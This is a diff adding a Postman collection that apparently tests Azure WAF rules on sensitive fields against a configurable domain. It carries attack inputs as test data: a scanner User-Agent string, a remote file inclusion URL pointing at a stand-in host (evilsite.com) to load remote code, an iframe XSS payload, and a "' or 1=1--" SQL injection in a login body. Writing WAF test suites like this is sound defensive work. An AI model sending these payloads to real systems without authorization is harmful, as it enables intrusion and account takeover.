@@ -1,0 +1,199 @@
+{
+	"info": {
+		"_postman_id": "d18fe44d-c86e-43c9-ac19-65af49f5f2f7",
+		"name": "Azure WAF - Sensitive Fields",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "9790016"
+	},
+	"item": [
+		{
+			"name": "Request Header Names - Scanner Detection",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "datacha0s",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://{{domain}}/search",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"search"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request Arg Names - RFI",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{domain}}/about?page=http://evilsite.com/evilcode.php",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"about"
+					],
+					"query": [
+						{
+							"key": "page",
+							"value": "http://evilsite.com/evilcode.php"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request Post Arg Names - XSS",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "captcha",
+							"value": "98",
+							"type": "text"
+						},
+						{
+							"key": "captchaId",
+							"value": "0",
+							"type": "text"
+						},
+						{
+							"key": "comment",
+							"value": "<iframe src=\"x-javascript&colon;alert(`xss`)\">",
+							"type": "text"
+						},
+						{
+							"key": "rating",
+							"value": "3",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://{{domain}}/contact",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"contact"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request JSON Arg Names - SQLi",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"email\":\"admin@juice-sh.op\",\r\n    \"password\":\"' or 1=1--\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://{{domain}}/login/",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"login",
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Custom Rule",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "captcha",
+							"value": "98",
+							"type": "text"
+						},
+						{
+							"key": "captchaId",
+							"value": "0",
+							"type": "text"
+						},
+						{
+							"key": "comment",
+							"value": "<iframe src=\"x-javascript&colon;alert(`xss`)\">",
+							"type": "text"
+						},
+						{
+							"key": "rating",
+							"value": "3",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://{{domain}}/contact",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"contact"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "domain",
+			"value": "",
+			"type": "string"
+		}
+	]
+}
